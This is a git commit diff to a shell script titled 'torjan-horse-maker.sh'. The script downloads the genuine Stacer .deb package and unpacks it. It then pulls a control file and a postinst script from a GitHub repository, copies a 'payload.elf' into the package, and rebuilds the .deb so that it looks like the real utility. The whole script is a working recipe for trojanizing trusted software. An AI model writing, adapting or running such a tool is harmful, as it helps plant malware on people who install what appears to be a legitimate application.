c27947d56ce4dbba2ef6d67e8b753593be03e99e
3r0-r <80163540+3r0-r@users.noreply.github.com>
2021-03-06 11:33:31 -0500

    Update torjan-horse-maker.sh

--- torjan-horse-maker.sh
+++ torjan-horse-maker.sh
@@ -2,15 +2,15 @@ wget https://github.com/oguzhaninan/Stacer/releases/download/v1.1.0/stacer_1.1.0
 dpkg -x stacer_1.1.0_amd64.deb stacer_1.1.0_amd64/
 cd stacer_1.1.0_amd64/
 mkdir DEBIAN
-wget https://github.com/3r0-r/test/archive/main.zip
+wget https://github.com/3r0-r/torjan-horse-maker/archive/main.zip
 unzip main.zip
 cd test-main
 chmod 755 postinst
-mv control postinst ~/Desktop/test/stacer_1.1.0_amd64/DEBIAN
+mv control postinst ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/DEBIAN
 cd ..
 rm main.zip
 cd ..
-mv payload.elf ~/Desktop/test/stacer_1.1.0_amd64/usr/
+mv payload.elf ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/usr/
 dpkg-deb --build stacer_1.1.0_amd64
 rm -r stacer_1.1.0_amd64
 
